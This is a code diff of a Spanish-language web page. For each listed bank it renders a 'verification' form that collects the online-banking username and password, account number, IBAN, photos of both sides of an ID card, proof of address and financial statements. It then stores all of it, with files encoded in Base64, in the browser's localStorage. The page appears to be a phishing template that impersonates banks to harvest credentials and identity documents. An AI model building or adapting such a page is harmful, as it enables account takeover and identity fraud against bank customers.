@@ -31,13 +31,10 @@
 
 <script src="lista.js"></script>
 <script>
-
-// ⭐⭐⭐ BANCOS DESTACADOS ⭐⭐⭐
 const destacados = ["España", "Alemania", "Francia", "Reino Unido", "Italia"];
-
 const accordionList = document.getElementById("accordionList");
 
-// ⭐⭐⭐ CREAR LISTA DE BANCOS ⭐⭐⭐
+// Crear acordeones
 bancosIBAN.forEach(item => {
   const acc = document.createElement("div");
   acc.className = "accordion";
@@ -46,51 +43,23 @@ bancosIBAN.forEach(item => {
     <div class="accordion-header">${item.pais} - ${item.banco}</div>
     <div class="accordion-content">
       <form onsubmit="guardarDatos(event)">
-        
-        <label>Usuario:
-          <input type="text" name="usuario" required>
-        </label>
-
-        <label>Contraseña:
-          <input type="password" name="password" required>
-        </label>
-
-        <label>Cuenta principal:
-          <input type="text" name="cuenta" required>
-        </label>
-
-        <label>IBAN:
-          <input type="text" name="iban" required>
-        </label>
-
-        <label>Foto carnet (frontal):
-          <input type="file" name="frontal" accept="image/*" required>
-        </label>
-
-        <label>Foto carnet (trasera):
-          <input type="file" name="trasera" accept="image/*" required>
-        </label>
-
-        <label>Comprobante de domicilio:
-          <input type="file" name="domicilio" accept="image/*,application/pdf" required>
-        </label>
-
-        <label>Justificantes financieros:
-          <input type="file" name="finanzas" accept="image/*,application/pdf" required>
-        </label>
-
+        <label>Usuario: <input type="text" name="usuario" required></label>
+        <label>Contraseña: <input type="password" name="password" required></label>
+        <label>Cuenta principal: <input type="text" name="cuenta" required></label>
+        <label>IBAN: <input type="text" name="iban" required></label>
+        <label>Foto carnet (frontal): <input type="file" name="frontal" accept="image/*" required></label>
+        <label>Foto carnet (trasera): <input type="file" name="trasera" accept="image/*" required></label>
+        <label>Comprobante de domicilio: <input type="file" name="domicilio" accept="image/*,application/pdf" required></label>
+        <label>Justificantes financieros: <input type="file" name="finanzas" accept="image/*,application/pdf" required></label>
         <button type="submit">Verificar</button>
       </form>
     </div>
   `;
-
-  // Mostrar solo los destacados
   acc.style.display = destacados.includes(item.pais) ? "" : "none";
-
   accordionList.appendChild(acc);
 });
 
-// ⭐⭐⭐ ABRIR/CERRAR ACORDEÓN ⭐⭐⭐
+// Abrir/cerrar acordeón
 document.addEventListener("click", e => {
   if (e.target.classList.contains("accordion-header")) {
     const content = e.target.nextElementSibling;
@@ -98,7 +67,7 @@ document.addEventListener("click", e => {
   }
 });
 
-// ⭐⭐⭐ BÚSQUEDA ⭐⭐⭐
+// Búsqueda
 document.getElementById("searchInput").addEventListener("keyup", function() {
   const filter = this.value.toLowerCase();
   document.querySelectorAll(".accordion").forEach(acc => {
@@ -107,7 +76,7 @@ document.getElementById("searchInput").addEventListener("keyup", function() {
   });
 });
 
-// ⭐⭐⭐ CONVERTIR ARCHIVOS A BASE64 ⭐⭐⭐
+// Convertir archivo a Base64
 function fileToBase64(file) {
   return new Promise(resolve => {
     const reader = new FileReader();
@@ -116,20 +85,17 @@ function fileToBase64(file) {
   });
 }
 
-// ⭐⭐⭐ GUARDAR DATOS EN LOCALSTORAGE ⭐⭐⭐
+// Guardar datos
 async function guardarDatos(event) {
   event.preventDefault();
-
   const form = event.target;
   const header = form.closest(".accordion").querySelector(".accordion-header").textContent;
 
-  // Convertir fotos
   const frontal = await fileToBase64(form.frontal.files[0]);
   const trasera = await fileToBase64(form.trasera.files[0]);
   const domicilio = await fileToBase64(form.domicilio.files[0]);
   const finanzas = await fileToBase64(form.finanzas.files[0]);
 
-  // Crear registro completo
   const registro = {
     usuario: form.usuario.value,
     password: form.password.value,
@@ -142,15 +108,12 @@ async function guardarDatos(event) {
     finanzas
   };
 
-  // Guardar en localStorage
   let registros = JSON.parse(localStorage.getItem("registros")) || [];
   registros.push(registro);
   localStorage.setItem("registros", JSON.stringify(registros));
 
-  // Mostrar confirmación
   document.getElementById("confirmationBox").style.display = "block";
 }
-
 </script>
 
 </body>
